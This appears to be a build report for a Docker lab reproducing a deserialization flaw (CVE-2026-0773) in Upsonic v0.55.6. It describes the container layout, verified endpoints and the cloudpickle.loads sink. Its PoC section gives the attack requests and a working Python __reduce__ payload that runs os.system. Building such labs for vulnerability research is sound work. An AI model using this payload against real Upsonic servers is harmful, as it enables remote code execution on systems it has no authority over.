# Lab Build Report: CVE-2026-0773

## Lab Architecture

**Single-container architecture** — Both Upsonic servers (main server and tools server) run inside one container because the tools_server binds to `localhost:8086` and the main server proxies to it via `httpx` over the loopback interface. Unix socket / localhost communication cannot cross container boundaries.

### Container Topology

```
┌─────────────────────────────────────────────────┐
│  cve-2026-0773-vulnerable                       │
│                                                 │
│  ┌─────────────────────────────────────────┐    │
│  │ Main Server (uvicorn)                   │    │
│  │ upsonic.server.api:app                  │    │
│  │ Binds: 0.0.0.0:7541                     │    │
│  │                                         │    │
│  │ Endpoints:                              │    │
│  │  POST /tools/add_tool  ──proxy──┐       │    │
│  │  POST /level_one/gpt4o (direct) │       │    │
│  │  POST /level_two/agent (direct) │       │    │
│  │  GET  /status                   │       │    │
│  └─────────────────────────────────│───────┘    │
│                                    │            │
│  ┌─────────────────────────────────▼───────┐    │
│  │ Tools Server (uvicorn)                  │    │
│  │ upsonic.tools_server.server.api:app     │    │
│  │ Binds: localhost:8086                   │    │
│  │                                         │    │
│  │ Endpoint:                               │    │
│  │  POST /tools/add_tool                   │    │
│  │  → cloudpickle.loads(decoded_function)  │    │
│  │  → RCE via __reduce__                   │    │
│  └─────────────────────────────────────────┘    │
└─────────────────────────────────────────────────┘
```

## Container Details

| Property | Value |
|----------|-------|
| **Container Name** | `cve-2026-0773-vulnerable` |
| **Image** | `cve-2026-0773-vulnerable:latest` |
| **Base Image** | `python:3.12-slim` |
| **Software** | Upsonic v0.55.6 |
| **Main Server Port** | 7541 (bound to 0.0.0.0 — externally accessible) |
| **Tools Server Port** | 8086 (bound to localhost — internal only) |
| **Networks** | `lab-net` |
| **Container IP** | Dynamically assigned |
| **Health Check** | `GET http://localhost:7541/status` → `{"status": "Server is running"}` |

## Build Status

| Step | Status | Notes |
|------|--------|-------|
| Docker image build | ✅ SUCCESS | Built from `python:3.12-slim`, clones Upsonic at `v0.55.6` tag |
| Upsonic pip install | ✅ SUCCESS | Installed v0.55.6 with all dependencies (cloudpickle 3.1.2, fastapi 0.134.0, uvicorn 0.41.0) |
| Vulnerable code verification | ✅ SUCCESS | `cloudpickle.loads()` confirmed at `tools_server/server/tools.py:378` |
| Container startup | ✅ SUCCESS | Container healthy within 10 seconds |
| Main server (port 7541) | ✅ RUNNING | `GET /status` returns 200 |
| Tools server (port 8086) | ✅ RUNNING | Responds on `/docs`, processes `/tools/add_tool` requests |
| Endpoint accessibility | ✅ VERIFIED | All endpoints reachable via container IP |

## Verified Endpoints

All tested via container IP:

| Endpoint | Method | HTTP Status | Notes |
|----------|--------|-------------|-------|
| `/status` | GET | 200 | Health check — `{"status": "Server is running"}` |
| `/tools/add_tool` | POST | 500 | Expected: invalid test data hits `cloudpickle.loads()` and throws `UnpicklingError`. Valid cloudpickle payload will trigger RCE. |
| `/level_one/gpt4o` | POST | 200 | Direct deserialization sink on main server (no proxy needed) |
| `/level_two/agent` | POST | 200 | Direct deserialization sink on main server (no proxy needed) |
| `/docs` | GET | 200 | FastAPI Swagger UI |
| `/openapi.json` | GET | 200 | OpenAPI spec with all routes |

## Deserialization Chain Verified

Log output confirms the full attack chain is functional:
```
File "/opt/upsonic/src/upsonic/tools_server/server/tools.py", line 378, in add_tool
    deserialized_function = cloudpickle.loads(decoded_function)
                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
_pickle.UnpicklingError: invalid load key, '\xb5'.
```

The request successfully traverses: `client → main_server:7541 → httpx proxy → tools_server:8086 → cloudpickle.loads()`. A crafted `__reduce__` payload will achieve RCE at the deserialization point.

## Start/Stop Commands

### Start the lab
```bash
docker compose up -d
```

### Check status
```bash
docker compose ps
```

### View logs
```bash
docker compose logs -f vulnerable
```

### Stop the lab
```bash
docker compose down
```

## Files Created

| File | Path | Purpose |
|------|------|---------|
| `Dockerfile.vulnerable` | `Dockerfile.vulnerable` | Builds Upsonic v0.55.6 from source on python:3.12-slim |
| `docker-compose.yml` | `docker-compose.yml` | Orchestrates the vulnerable container with networking |
| `entrypoint.sh` | `entrypoint.sh` | Starts both uvicorn servers and waits for readiness |

## PoC Agent Instructions

### Target Information
- **Container name**: `cve-2026-0773-vulnerable`
- **Attack port**: 7541 (main server, externally accessible)
- **Host port**: 7541 (mapped from container)

### Primary Attack Vector
```
POST http://<CONTAINER_IP>:7541/tools/add_tool
Content-Type: application/json

{"function": "<base64-encoded cloudpickle RCE payload>"}
```

### Alternative Direct Vectors (no tools_server proxy needed)
```
POST http://<CONTAINER_IP>:7541/level_one/gpt4o
{"prompt": "x", "response_format": "<base64-encoded cloudpickle payload>"}

POST http://<CONTAINER_IP>:7541/level_two/agent
{"agent_id": "x", "prompt": "x", "response_format": "<base64-encoded cloudpickle payload>"}
```

### Payload Generation
```python
import cloudpickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
payload = base64.b64encode(cloudpickle.dumps(Exploit())).decode()
```

### Verification
```bash
# After sending exploit payload, verify RCE:
docker exec cve-2026-0773-vulnerable cat /tmp/pwned
```

## Known Issues

- **None**. The lab builds cleanly, starts quickly, and all endpoints are accessible.
- The tools_server binds to localhost:8086 — it is NOT directly accessible from outside the container. This is by design; the attack target is the main server on port 7541 which proxies requests.
- Alternative vectors (`/level_one/gpt4o`, `/level_two/agent`) work directly on the main server and do NOT need the tools_server to be running.
